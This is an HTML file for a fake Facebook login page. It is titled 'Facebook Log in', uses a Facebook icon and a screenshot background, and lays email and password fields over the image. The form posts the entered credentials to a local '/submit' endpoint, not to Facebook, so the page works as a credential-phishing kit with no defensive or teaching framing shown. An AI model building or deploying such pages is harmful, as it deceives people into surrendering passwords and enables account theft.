<!DOCTYPE html>
<html lang="en">
<head>
    <style type="text/css">
        body{
            background:url('../img/fb.png') no-repeat;
            background-size:cover;
        }
        .container{
            margin-top: 79.1%;
        }
        .but{
            height:3.9em;
            width: 34.5em;
            border-radius: 30px;
            
            background:#0064E0;
            border: #0021bb 1px solid;
            color: white;
            margin-top: 1px;
        }
        #emailOrMobile, #password{
            height:4.3em;
            width: 33em;
            border-radius: 12px;
            background:white;
            border: #A2ACB5 1px solid;
            color: black;
            margin-bottom:1em;
            padding-left:1em;
        }
    </style>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Log in</title>
    <link rel="icon" href="img/fbicon.png">
</head>
<body>
    <div class="container">
        <form id="loginForm" action="/submit" method="POST">
            <input type="text" id="emailOrMobile" name="emailOrMobile" placeholder="Mobile number or email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button class="but" type="submit"><b>Log in</b></button>
        </form>
    </div>
</body>
</html>
